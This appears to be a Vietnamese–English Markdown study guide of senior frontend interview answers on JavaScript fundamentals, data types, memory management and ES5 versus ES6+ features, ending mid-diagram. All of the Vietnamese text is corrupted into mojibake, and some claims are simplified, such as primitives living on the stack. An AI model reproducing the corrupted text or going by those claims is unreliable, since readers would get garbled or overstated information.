# SUMMARY - Senior Frontend Interview Answers (Ti·∫øng Vi·ªát)

M·ªói m·ª•c: P1 = T√™n c√¢u h·ªèi; P2 = Tr·∫£ l·ªùi ng·∫Øn g·ªçn/chi ti·∫øt ·ªü level Senior.

---
**üóÇÔ∏è Ch√∫ th√≠ch thu·∫≠t ng·ªØ (Ti·∫øng Vi·ªát)**

ƒêo·∫°n n√†y l√† 1 b·∫£ng thu·∫≠t ng·ªØ nhanh ƒë·ªÉ tra c·ª©u khi ƒë·ªçc c√°c c√¢u tr·∫£ l·ªùi. N·∫øu b·∫°n th·∫•y m·ªôt t·ª´ k·ªπ thu·∫≠t trong ph·∫ßn Q*, d√πng ph·∫ßn n√†y ƒë·ªÉ hi·ªÉu √Ω nghƒ©a b·∫±ng ti·∫øng Vi·ªát.

- Hoisting: "n√¢ng" khai b√°o l√™n ƒë·∫ßu ph·∫°m vi (scope). `var` ƒë∆∞·ª£c kh·ªüi t·∫°o l√† `undefined`; `let/const` n·∫±m trong TDZ (Temporal Dead Zone) tr∆∞·ªõc khi kh·ªüi t·∫°o.
- TDZ (Temporal Dead Zone): v√πng t·ª´ ƒë·∫ßu block ƒë·∫øn khi khai b√°o `let/const` ‚Äî truy c·∫≠p trong v√πng n√†y g√¢y `ReferenceError`.
- Closure (bao ƒë√≥ng): h√†m nh·ªõ ƒë∆∞·ª£c bi·∫øn t·ª´ scope b√™n ngo√†i ngay c·∫£ khi h√†m ngo√†i ƒë√£ tr·∫£ v·ªÅ.
- Event Loop: c∆° ch·∫ø x·ª≠ l√Ω async ‚Äî Call Stack ‚áí Microtasks (Promise) ‚áí Render ‚áí Macrotasks (setTimeout, I/O).
- Microtask: nhi·ªám v·ª• ∆∞u ti√™n cao (Promise.then, queueMicrotask) ‚Äî ch·∫°y h·∫øt tr∆∞·ªõc macrotask.
- Macrotask: nhi·ªám v·ª• ∆∞u ti√™n th·∫•p (setTimeout, setInterval, I/O) ‚Äî l·∫•y 1 macrotask m·ªói v√≤ng.
- Call Stack: ngƒÉn x·∫øp th·ª±c thi m√£ ƒë·ªìng b·ªô (LIFO).
- Heap: v√πng nh·ªõ c·∫•p ph√°t cho objects/arrays/functions.
- GC (Garbage Collector): thu gom r√°c t·ª± ƒë·ªông (mark-and-sweep) ‚Äî thu d·ªçn c√°c object kh√¥ng c√≤n reachable.
- Prototype / prototype chain: c∆° ch·∫ø k·∫ø th·ª´a trong JS (class ch·ªâ l√† syntactic sugar).
- this binding: c√°ch x√°c ƒë·ªãnh `this` (new > explicit call/apply/bind > implicit > default).
- Promise / async-await: Promise l√† object ƒë·∫°i di·ªán async; `async/await` l√† c√∫ ph√°p d·ªÖ ƒë·ªçc cho Promise.
- Shallow vs Deep copy: sao ch√©p n√¥ng ch·ªâ copy top-level; sao ch√©p s√¢u clone to√†n b·ªô c·∫•u tr√∫c (v√≠ d·ª• `structuredClone`).
- Map / Set: collection hi·ªán ƒë·∫°i (Map cho key b·∫•t k·ª≥; Set cho gi√° tr·ªã duy nh·∫•t).
- WeakMap / WeakSet / WeakRef / FinalizationRegistry: tham chi·∫øu y·∫øu gi√∫p tr√°nh gi·ªØ object kh·ªèi GC; kh√¥ng deterministic, kh√¥ng iterable.
- Reflow / Repaint: cost l√†m layout/paint DOM ‚Äî tr√°nh thao t√°c DOM l·∫∑p nhi·ªÅu l·∫ßn.
- SSR / SSG / ISR (Next.js): c√°c chi·∫øn l∆∞·ª£c render ph√≠a server ho·∫∑c build-time.
- XSS / CSRF / CORS: c√°c r·ªßi ro b·∫£o m·∫≠t frontend; XSS = script injection; CSRF = gi·∫£ m·∫°o request; CORS = ch√≠nh s√°ch chia s·∫ª ngu·ªìn.
- CSP (Content Security Policy): header gi√∫p gi·∫£m r·ªßi ro XSS.
- CDN: m·∫°ng ph√¢n ph·ªëi n·ªôi dung, gi·∫£m latency.
- Web Worker: offload c√¥ng vi·ªác n·∫∑ng kh·ªèi main thread.
- requestAnimationFrame (rAF): d√πng cho animation, ch·∫°y tr∆∞·ªõc render frame.
- Memoization / Cache: l∆∞u k·∫øt qu·∫£ ƒë·ªÉ tr√°nh t√≠nh to√°n l·∫°i; c·∫©n th·∫≠n memory leaks.
- Currying / Higher-Order Functions (HOF): k·ªπ thu·∫≠t h√†m cao c·∫•p ƒë·ªÉ compose v√† t√°i s·ª≠ d·ª•ng logic.
- IIFE: h√†m t·ª± g·ªçi ƒë·ªÉ t·∫°o scope ri√™ng, th∆∞·ªùng d√πng cho module pattern tr∆∞·ªõc ES modules.
- StructuredClone: native deep clone hi·ªán ƒë·∫°i (h·ªó tr·ª£ Date, RegExp...), tr√°nh d√πng JSON hack n·∫øu c·∫ßn gi·ªØ ki·ªÉu ph·ª©c t·∫°p.

---
## 01. üöÄ Q01: JavaScript Fundamentals Overview - T·ªïng Quan N·ªÅn T·∫£ng  

**P1: T√™n c√¢u h·ªèi:** üöÄ Q01: JavaScript Fundamentals Overview - T·ªïng Quan N·ªÅn T·∫£ng  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (3-5 ph√∫t):**

**"JavaScript l√† ng√¥n ng·ªØ l·∫≠p tr√¨nh ƒë∆°n lu·ªìng, b·∫•t ƒë·ªìng b·ªô, ch·∫°y tr√™n V8 engine v·ªõi Event Loop ƒë·ªÉ x·ª≠ l√Ω I/O kh√¥ng ch·∫∑n.**

**üîë 5 Tr·ª• C·ªôt N·ªÅn T·∫£ng:**

1. **Ki·ªÉu D·ªØ Li·ªáu & B·ªô Nh·ªõ**:
   - 7 ki·ªÉu nguy√™n th·ªßy (number, string, boolean, null, undefined, symbol, bigint) + Object
   - Primitive = stack (theo gi√° tr·ªã) // Nguy√™n th·ªßy l∆∞u trong ngƒÉn x·∫øp, sao ch√©p theo gi√° tr·ªã
   - Reference = heap (theo tham chi·∫øu) // Tham chi·∫øu l∆∞u trong ƒë·ªëng, sao ch√©p theo tham chi·∫øu
   - GC t·ª± ƒë·ªông d·ªçn b·ªô nh·ªõ (Mark-and-Sweep algorithm) // Thu gom r√°c t·ª± ƒë·ªông b·∫±ng thu·∫≠t to√°n ƒë√°nh d·∫•u v√† qu√©t

2. **Execution Context & Scope**:
   - Call Stack th·ª±c thi code ƒë·ªìng b·ªô (LIFO) // NgƒÉn x·∫øp g·ªçi th·ª±c thi m√£ ƒë·ªìng b·ªô, v√†o sau ra tr∆∞·ªõc
   - Scope chain: Global ‚Üí Function ‚Üí Block scope // Chu·ªói ph·∫°m vi: to√†n c·ª•c ‚Üí h√†m ‚Üí kh·ªëi
   - Hoisting: `var` kh·ªüi t·∫°o undefined, `let/const` trong TDZ // N√¢ng l√™n: var kh·ªüi t·∫°o undefined, let/const trong v√πng ch·∫øt t·∫°m th·ªùi
   - Closure = h√†m + m√¥i tr∆∞·ªùng t·ª´ v·ª±ng xung quanh // Bao ƒë√≥ng = h√†m + m√¥i tr∆∞·ªùng xung quanh

3. **B·∫•t ƒê·ªìng B·ªô (Event Loop)**:
   - **Microtask Queue** (∆∞u ti√™n cao): Promise.then, queueMicrotask // H√†ng ƒë·ª£i nhi·ªám v·ª• nh·ªè (∆∞u ti√™n cao): l·ªùi h·ª©a, nhi·ªám v·ª• nh·ªè
   - **Macrotask Queue** (∆∞u ti√™n th·∫•p): setTimeout, setInterval // H√†ng ƒë·ª£i nhi·ªám v·ª• l·ªõn (∆∞u ti√™n th·∫•p): ƒë·∫∑t th·ªùi gian, kho·∫£ng th·ªùi gian
   - Event Loop: Call Stack ‚Üí Microtasks ‚Üí UI Render ‚Üí 1 Macrotask // V√≤ng l·∫∑p s·ª± ki·ªán: ngƒÉn x·∫øp g·ªçi ‚Üí nhi·ªám v·ª• nh·ªè ‚Üí hi·ªÉn th·ªã UI ‚Üí 1 nhi·ªám v·ª• l·ªõn
   - Async patterns: Callbacks ‚Üí Promises ‚Üí Async/Await // M·∫´u b·∫•t ƒë·ªìng b·ªô: g·ªçi l·∫°i ‚Üí l·ªùi h·ª©a ‚Üí b·∫•t ƒë·ªìng b·ªô/ch·ªù

4. **OOP & Prototypes**:
   - Prototype chain: m·ªói object c√≥ `__proto__` tr·ªè ƒë·∫øn prototype // Chu·ªói nguy√™n m·∫´u: m·ªói ƒë·ªëi t∆∞·ª£ng c√≥ __proto__ tr·ªè ƒë·∫øn nguy√™n m·∫´u
   - Class = syntactic sugar cho prototype-based inheritance // L·ªõp = ƒë∆∞·ªùng c√∫ ph√°p cho k·∫ø th·ª´a d·ª±a tr√™n nguy√™n m·∫´u
   - `this` binding: new ‚Üí explicit (call/apply/bind) ‚Üí implicit ‚Üí default // R√†ng bu·ªôc this: m·ªõi ‚Üí r√µ r√†ng (g·ªçi/√°p d·ª•ng/r√†ng bu·ªôc) ‚Üí ng·∫ßm ‚Üí m·∫∑c ƒë·ªãnh

5. **Modern JavaScript (ES6+)**:
   - `let/const` block scope thay `var` // Ch√∫ gi·∫£i: let/const ph·∫°m vi kh·ªëi thay var
   - Arrow functions = lexical `this` // H√†m m≈©i t√™n = this t·ª´ v·ª±ng
   - Destructuring, spread/rest operators // Ph√¢n r√£, to√°n t·ª≠ tr·∫£i/rest
   - Modules (import/export), classes // M√¥-ƒëun (nh·∫≠p/xu·∫•t), l·ªõp
   - Promise, async/await cho async code // L·ªùi h·ª©a, b·∫•t ƒë·ªìng b·ªô/ch·ªù cho m√£ b·∫•t ƒë·ªìng b·ªô

**‚ö†Ô∏è L·ªói Th∆∞·ªùng G·∫∑p:**
- Mutate objects/arrays tr·ª±c ti·∫øp ‚Üí d√πng spread ho·∫∑c immutable methods // ƒê·ªôt bi·∫øn ƒë·ªëi t∆∞·ª£ng/m·∫£ng tr·ª±c ti·∫øp ‚Üí d√πng tr·∫£i ho·∫∑c ph∆∞∆°ng th·ª©c b·∫•t bi·∫øn
- Qu√™n `return` trong arrow function `() => { value }` ‚Üí ph·∫£i `() => value` ho·∫∑c `() => ({ value })` // Qu√™n return trong h√†m m≈©i t√™n
- `==` vs `===`: lu√¥n d√πng `===` (strict equality) // So s√°nh l·ªèng vs nghi√™m ng·∫∑t: lu√¥n d√πng nghi√™m ng·∫∑t
- Closure memory leaks: event listeners kh√¥ng cleanup // R√≤ r·ªâ b·ªô nh·ªõ bao ƒë√≥ng: tr√¨nh nghe s·ª± ki·ªán kh√¥ng d·ªçn d·∫πp
- `this` m·∫•t context khi pass method: d√πng arrow function ho·∫∑c bind // this m·∫•t ng·ªØ c·∫£nh khi truy·ªÅn ph∆∞∆°ng th·ª©c: d√πng h√†m m≈©i t√™n ho·∫∑c r√†ng bu·ªôc

**üí° Ki·∫øn Th·ª©c Senior:**
- **Performance**: Tr√°nh blocking main thread, d√πng Web Workers cho heavy computation // Hi·ªáu su·∫•t: tr√°nh ch·∫∑n lu·ªìng ch√≠nh, d√πng c√¥ng nh√¢n web cho t√≠nh to√°n n·∫∑ng
- **Memory**: WeakMap/WeakSet cho weak references tr√°nh leaks // B·ªô nh·ªõ: WeakMap/WeakSet cho tham chi·∫øu y·∫øu tr√°nh r√≤ r·ªâ
- **Security**: XSS prevention (sanitize inputs), CSP headers // B·∫£o m·∫≠t: ngƒÉn XSS (l√†m s·∫°ch ƒë·∫ßu v√†o), ti√™u ƒë·ªÅ CSP
- **Tooling**: TypeScript cho type safety, ESLint cho code quality // C√¥ng c·ª•: TypeScript cho an to√†n ki·ªÉu, ESLint cho ch·∫•t l∆∞·ª£ng m√£
- **Patterns**: Module pattern, Observer, Factory, Singleton // M·∫´u: m·∫´u m√¥-ƒëun, quan s√°t vi√™n, nh√† m√°y, ƒë∆°n l·∫ª

---
---
## 02. üéØ Q02: Data Types & Memory Management - T·ªïng H·ª£p To√†n Di·ªán  

**P1: T√™n c√¢u h·ªèi:** üéØ Q02: Data Types & Memory Management - T·ªïng H·ª£p To√†n Di·ªán  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (2-3 ph√∫t):**

**"JavaScript c√≥ 8 ki·ªÉu d·ªØ li·ªáu: 7 nguy√™n th·ªßy (kh√¥ng thay ƒë·ªïi ƒë∆∞·ª£c) + 1 ph·ª©c t·∫°p (object - thay ƒë·ªïi ƒë∆∞·ª£c).**

**üì¶ Nguy√™n Th·ªßy vs Tham Chi·∫øu:**
- **Nguy√™n th·ªßy** (number, string, boolean, undefined, null, symbol, bigint):
  - L∆∞u theo GI√Å TR·ªä trong stack. // L∆∞u gi√° tr·ªã th·ª±c t·∫ø trong ngƒÉn x·∫øp
  - Kh√¥ng thay ƒë·ªïi ƒë∆∞·ª£c ‚Üí g√°n l·∫°i t·∫°o gi√° tr·ªã m·ªõi. // Kh√¥ng th·ªÉ s·ª≠a ƒë·ªïi, g√°n l·∫°i t·∫°o b·∫£n sao m·ªõi
  - Copy theo gi√° tr·ªã ‚Üí c√°c b·∫£n sao ƒë·ªôc l·∫≠p. // Sao ch√©p gi√° tr·ªã, b·∫£n sao kh√¥ng li√™n k·∫øt
- **Tham chi·∫øu** (object, array, function):
  - L∆∞u theo THAM CHI·∫æU trong heap. // L∆∞u ƒë·ªãa ch·ªâ tr·ªè ƒë·∫øn v√πng nh·ªõ heap
  - Thay ƒë·ªïi ƒë∆∞·ª£c ‚Üí s·ª≠a tr·ª±c ti·∫øp. // C√≥ th·ªÉ s·ª≠a ƒë·ªïi n·ªôi dung
  - Copy theo tham chi·∫øu ‚Üí tr·ªè ƒë·∫øn c√πng object. // Sao ch√©p ƒë·ªãa ch·ªâ, c√πng tr·ªè ƒë·∫øn m·ªôt object

**üîë Kh√°i Ni·ªám C·ªët L√µi:**
1. **== vs ===**:
   - `==`: So s√°nh l·ªèng ‚Üí chuy·ªÉn ƒë·ªïi ki·ªÉu t·ª± ƒë·ªông (vd: `"5" == 5` ‚Üí true). // So s√°nh l·ªèng l·∫ªo, t·ª± ƒë·ªông chuy·ªÉn ki·ªÉu
   - `===`: So s√°nh nghi√™m ng·∫∑t ‚Üí kh√¥ng chuy·ªÉn ki·ªÉu (vd: `"5" === 5` ‚Üí false). // So s√°nh nghi√™m ng·∫∑t, kh√¥ng chuy·ªÉn ki·ªÉu
   - Th·ª±c h√†nh t·ªët: Lu√¥n d√πng `===` tr·ª´ khi ki·ªÉm tra null/undefined. // Lu√¥n d√πng nghi√™m ng·∫∑t tr·ª´ khi ki·ªÉm tra null/undefined

2. **null vs undefined**:
   - `undefined`: Bi·∫øn ch∆∞a ƒë∆∞·ª£c assign value (default). // Bi·∫øn ch∆∞a ƒë∆∞·ª£c g√°n gi√° tr·ªã (m·∫∑c ƒë·ªãnh)
   - `null`: Intentionally empty value (developer set). // Gi√° tr·ªã tr·ªëng c√≥ ch·ªß ƒë√≠ch (developer ƒë·∫∑t)
   - `typeof null` ‚Üí "object" (JavaScript bug legacy). // typeof null tr·∫£ v·ªÅ "object" (l·ªói c≈© c·ªßa JavaScript)

3. **Shallow Copy vs Deep Copy**:
   - **Shallow**: Copy top-level properties only ‚Üí nested objects v·∫´n reference. // Sao ch√©p n√¥ng: ch·ªâ sao ch√©p thu·ªôc t√≠nh c·∫•p tr√™n, object l·ªìng v·∫´n tham chi·∫øu
     ```js
     const shallow = { ...obj }; // Spread - To√°n t·ª≠ tr·∫£i
     const shallow2 = Object.assign({}, obj); // Ch√∫ gi·∫£i: Object.assign
     ```
   - **Deep**: Copy recursively t·∫•t c·∫£ levels ‚Üí independent clone. // Sao ch√©p s√¢u: sao ch√©p ƒë·ªá quy t·∫•t c·∫£ c·∫•p ‚Üí b·∫£n sao ƒë·ªôc l·∫≠p
     ```js
     const deep = structuredClone(obj); // Native (modern) - T·ª± nhi√™n (hi·ªán ƒë·∫°i)
     const deep2 = JSON.parse(JSON.stringify(obj)); // Hack (lose functions, dates) - Hack (m·∫•t h√†m, ng√†y th√°ng)
     ```

4. **Type Checking**:
   - `typeof`: Check primitive types (`typeof "hello"` ‚Üí "string"). // Ki·ªÉm tra ki·ªÉu nguy√™n th·ªßy
   - `instanceof`: Check object types (`[] instanceof Array` ‚Üí true). // Ki·ªÉm tra ki·ªÉu object
   - `Array.isArray()`: Check arrays specifically. // Ki·ªÉm tra m·∫£ng c·ª• th·ªÉ
   - `Object.prototype.toString.call()`: Most accurate (e.g., `[object Date]`). // Ch√≠nh x√°c nh·∫•t

**‚ôªÔ∏è Memory Management & GC:**
- **Stack**: Primitive values, function calls (LIFO, fast, limited size). // NgƒÉn x·∫øp: gi√° tr·ªã nguy√™n th·ªßy, l·ªùi g·ªçi h√†m (v√†o sau ra tr∆∞·ªõc, nhanh, k√≠ch th∆∞·ªõc gi·ªõi h·∫°n)
- **Heap**: Objects, arrays (larger, slower, managed by GC). // ƒê·ªëng: object, m·∫£ng (l·ªõn h∆°n, ch·∫≠m h∆°n, qu·∫£n l√Ω b·ªüi GC)
- **Garbage Collection**: Mark-and-sweep algorithm ‚Üí auto free unreachable objects. // Thu gom r√°c: thu·∫≠t to√°n ƒë√°nh d·∫•u v√† qu√©t ‚Üí t·ª± ƒë·ªông gi·∫£i ph√≥ng object kh√¥ng th·ªÉ truy c·∫≠p
- **Memory Leaks**:
  - Global variables kh√¥ng cleanup. // Bi·∫øn to√†n c·ª•c kh√¥ng d·ªçn d·∫πp
  - Event listeners kh√¥ng remove. // Tr√¨nh nghe s·ª± ki·ªán kh√¥ng x√≥a
  - Closures gi·ªØ reference ƒë·∫øn large objects. // Bao ƒë√≥ng gi·ªØ tham chi·∫øu ƒë·∫øn object l·ªõn
  - Detached DOM nodes. // N√∫t DOM t√°ch r·ªùi

**‚ö†Ô∏è Common Pitfalls:**
- **Mutating objects**: `arr.push()` modify original ‚Üí d√πng immutable methods (`[...arr, item]`). // ƒê·ªôt bi·∫øn object: arr.push() s·ª≠a g·ªëc ‚Üí d√πng ph∆∞∆°ng th·ª©c b·∫•t bi·∫øn
- **Reference comparison**: `{} === {}` ‚Üí false (kh√°c reference). D√πng deep equality libraries (lodash.isEqual). // So s√°nh tham chi·∫øu: {} === {} ‚Üí false (tham chi·∫øu kh√°c). D√πng th∆∞ vi·ªán so s√°nh s√¢u
- **Type coercion bugs**: `"5" + 3` ‚Üí "53" (string concat), `"5" - 3` ‚Üí 2 (number subtract). // L·ªói √©p ki·ªÉu: "5" + 3 ‚Üí "53" (n·ªëi chu·ªói), "5" - 3 ‚Üí 2 (tr·ª´ s·ªë)
- **Falsy values**: `0`, `""`, `null`, `undefined`, `false`, `NaN` ‚Üí t·∫•t c·∫£ falsy nh∆∞ng kh√°c nhau! // Gi√° tr·ªã falsy: 0, "", null, undefined, false, NaN ‚Üí t·∫•t c·∫£ falsy nh∆∞ng kh√°c nhau!

**üí° Senior Insights:**
- **Immutability**: Prefer immutable operations (spread, map, filter) ‚Üí easier debugging, avoid side effects. // B·∫•t bi·∫øn: ∆∞u ti√™n thao t√°c b·∫•t bi·∫øn ‚Üí d·ªÖ debug h∆°n, tr√°nh t√°c d·ª•ng ph·ª•
- **WeakMap/WeakSet**: Hold weak references ‚Üí auto GC khi keys kh√¥ng c√≤n reference ‚Üí prevent memory leaks. // WeakMap/WeakSet: gi·ªØ tham chi·∫øu y·∫øu ‚Üí t·ª± ƒë·ªông GC khi keys kh√¥ng c√≤n tham chi·∫øu ‚Üí ngƒÉn r√≤ r·ªâ b·ªô nh·ªõ
- **structuredClone()**: Modern deep clone (support Dates, RegExp, Typed Arrays), but lose functions/symbols. // structuredClone(): sao ch√©p s√¢u hi·ªán ƒë·∫°i (h·ªó tr·ª£ Ng√†y, RegExp, M·∫£ng ƒë√£ nh·∫≠p), nh∆∞ng m·∫•t h√†m/bi·ªÉu t∆∞·ª£ng
- **Performance**: Primitive faster than objects (stack vs heap). D√πng primitives when possible. // Hi·ªáu su·∫•t: nguy√™n th·ªßy nhanh h∆°n object (ngƒÉn x·∫øp vs ƒë·ªëng). D√πng nguy√™n th·ªßy khi c√≥ th·ªÉ
- **TypeScript**: Eliminate runtime type errors ‚Üí catch type mistakes at compile time. // TypeScript: lo·∫°i b·ªè l·ªói ki·ªÉu runtime ‚Üí b·∫Øt l·ªói ki·ªÉu l√∫c bi√™n d·ªãch

---

> **T·ªïng h·ª£p**: Primitive vs Reference, Falsy/Truthy, == vs ===, null vs undefined, Immutable vs Mutable, Deep/Shallow Copy, Type Checking, Memory Management & GC

---
---
## 03. ‚ö° Q03: ES5 vs ES6+ Features - So S√°nh Chi Ti·∫øt & C√°ch Ho·∫°t ƒê·ªông  

**P1: T√™n c√¢u h·ªèi:** ‚ö° Q03: ES5 vs ES6+ Features - So S√°nh Chi Ti·∫øt & C√°ch Ho·∫°t ƒê·ªông  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (2-3 ph√∫t):**

**"ES6+ (2015+) mang l·∫°i JavaScript hi·ªán ƒë·∫°i v·ªõi classes, modules, arrow functions, async/await.**

**üìä ES5 vs ES6+ (Key Differences):**

| Feature | ES5 (2009) | ES6+ (2015+) |
|---------|-----------|-------------|
| **Variables** | `var` (function scope) | `let/const` (block scope) |
| **Functions** | `function() {}` | Arrow `() => {}` |
| **Classes** | Prototype + constructor | `class` syntax |
| **Modules** | CommonJS/AMD | `import/export` |
| **Strings** | Concatenation `+` | Template literals `` `${}` `` |
| **Objects** | Manual copy | Spread `{...obj}`, destructuring |
| **Async** | Callbacks | Promises, async/await |
| **Loops** | `for`, `while` | `for...of`, `forEach`, `map` |

**üî• ES6+ Must-Know Features:**
1. **let/const**: Block scope ‚Üí avoid hoisting issues, `const` prevent reassignment.
2. **Arrow Functions**: Lexical `this`, concise syntax, no `arguments` object.
3. **Destructuring**: `const { name } = user`, `const [a, b] = arr` ‚Üí extract values easily.
4. **Spread/Rest**: `...` operator ‚Üí copy arrays/objects, function params.
5. **Template Literals**: `` `Hello ${name}` `` ‚Üí multi-line strings, interpolation.
6. **Classes**: `class Person extends User` ‚Üí OOP syntax (syntactic sugar cho prototypes).
7. **Modules**: `import { fn } from './module'` ‚Üí static imports, tree-shaking.
8. **Promises & Async/Await**: Better async handling than callbacks.
9. **Default Parameters**: `function fn(a = 1)` ‚Üí kh√¥ng c·∫ßn `a = a || 1`.
10. **Optional Chaining**: `user?.address?.city` ‚Üí safe navigation (ES2020).
11. **Nullish Coalescing**: `value ?? 'default'` ‚Üí kh√°c v·ªõi `||` (ch·ªâ check null/undefined).

**‚ö° ES2016-ES2023 Highlights:**
- **ES2016**: `**` (exponentiation), `Array.includes()`.
- **ES2017**: `async/await`, `Object.values/entries()`, string padding.
- **ES2018**: Rest/spread for objects, async iteration.
- **ES2019**: `Array.flat/flatMap()`, `Object.fromEntries()`.
- **ES2020**: Optional chaining `?.`, nullish coalescing `??`, `BigInt`, dynamic import.
- **ES2021**: `String.replaceAll()`, numeric separators `1_000_000`.
- **ES2022**: Top-level await, private fields `#private`, `Array.at()`.
- **ES2023**: `Array.findLast()`, `toSorted()`, `toReversed()` (immutable array methods).

**‚ö†Ô∏è Browser Compatibility:**
- **ES5**: Universal support (IE9+, all browsers).
- **ES6+**: Modern browsers (Chrome 51+, Firefox 54+, Safari 10+).
- **Solution**: Babel transpile ES6+ ‚Üí ES5 cho legacy browsers.
- **Trend**: Evergreen browsers auto-update ‚Üí ES6+ safe cho 95%+ users.

**üí° Senior Insights:**
- **Transpilation**: Babel transform ES6+ ‚Üí ES5 at build time ‚Üí support old browsers.
- **Polyfills**: Add missing features (e.g., `Promise`, `Array.includes()`) at runtime.
- **Bundle Size**: ES6+ code nh·ªè h∆°n sau minify (classes, arrow functions compact h∆°n ES5).
- **Performance**: Modern engines optimize ES6+ better (e.g., arrow functions, spread).
- **Best Practice**: Write ES6+, transpile for production, use feature detection (`if ('fetch' in window)`).

**üéØ Migration Tips:**
- Replace `var` ‚Üí `let/const` (use ESLint rule).
- Replace `function` ‚Üí arrow functions (except methods, constructors).
- Use destructuring ƒë·ªÉ extract values.
- Replace string concat ‚Üí template literals.
- Use `async/await` thay v√¨ `.then()` chains.

---

**‚ö° Quick Summary:**
> ES6+ = let/const, arrow functions, classes, destructuring, promises, modules. ES5 = var, function, callbacks

**üí° Ghi Nh·ªõ:**
- üî• **ES6 Key Features**: let/const, =>, class, {...spread}, [destructuring], `template`, Promise, import/export
- üì¶ **Block Scope**: let/const c√≥ block scope, var c√≥ function scope
- ‚ö° **Arrow Function**: Kh√¥ng c√≥ `this` ri√™ng, kh√¥ng c√≥ `arguments`, kh√¥ng d√πng l√†m constructor
- üéØ **Classes**: Syntactic sugar cho prototype-based inheritance

**Tr·∫£ l·ªùi:**

- **ES5 (ECMAScript 5, 2009)**: JavaScript c∆° b·∫£n v·ªõi function declarations, var, prototype-based inheritance, callbacks
- **ES6/ES2015+ (2015-now)**: Modern JavaScript v·ªõi classes, modules, arrow functions, destructuring, promises, async/await
- **üî• ∆Øu ƒëi·ªÉm ES6+**: Code ng·∫Øn g·ªçn h∆°n 30-50%, type-safe h∆°n v·ªõi const/let, performance t·ªët h∆°n v·ªõi optimizations, syntax hi·ªán ƒë·∫°i d·ªÖ ƒë·ªçc
- **‚ö†Ô∏è Nh∆∞·ª£c ƒëi·ªÉm ES6+**: C·∫ßn transpilation (Babel) cho IE11 v√† older browsers, learning curve cao h∆°n, bundle size c√≥ th·ªÉ l·ªõn h∆°n

**üéØ Timeline & Browser Support:**

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ                    JAVASCRIPT EVOLUTION TIMELINE                         ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ                                                                          ‚îÇ
‚îÇ  üìÖ ES5 (2009) - Stable, Universal Support                              ‚îÇ
‚îÇ     ‚úÖ All browsers (IE9+)                                              ‚îÇ
‚îÇ     ‚úÖ No transpilation needed                                          ‚îÇ
‚îÇ     ‚ùå Verbose syntax, limited features                                 ‚îÇ
‚îÇ                                                                          ‚îÇ
‚îÇ  üìÖ ES6/ES2015 (2015) - Major Update                                    ‚îÇ
‚îÇ     ‚Ä¢ Classes, Modules, Arrow Functions                                 ‚îÇ
‚îÇ     ‚Ä¢ let/const, Template Literals                                      ‚îÇ
‚îÇ     ‚Ä¢ Destructuring, Spread/Rest                                        ‚îÇ
‚îÇ     ‚Ä¢ Promises, Symbols, Iterators                                      ‚îÇ
‚îÇ     ‚úÖ Modern browsers (Chrome 51+, Firefox 54+, Safari 10+)           ‚îÇ
‚îÇ     ‚ö†Ô∏è  Needs Babel for IE11                                            ‚îÇ
‚îÇ                                                                          ‚îÇ
‚îÇ  üìÖ ES2016-ES2023 (Yearly Updates)                                      ‚îÇ
‚îÇ     ‚Ä¢ Async/Await (ES2017)                                              ‚îÇ
‚îÇ     ‚Ä¢ Optional Chaining ?. (ES2020)                                     ‚îÇ
‚îÇ     ‚Ä¢ Nullish Coalescing ?? (ES2020)                                    ‚îÇ
‚îÇ     ‚Ä¢ BigInt, Dynamic Import                                            ‚îÇ
‚îÇ     ‚Ä¢ Private Fields, Top-level await                                   ‚îÇ
‚îÇ     ‚úÖ Evergreen browsers auto-update                                   ‚îÇ
‚îÇ                                                                          ‚îÇ
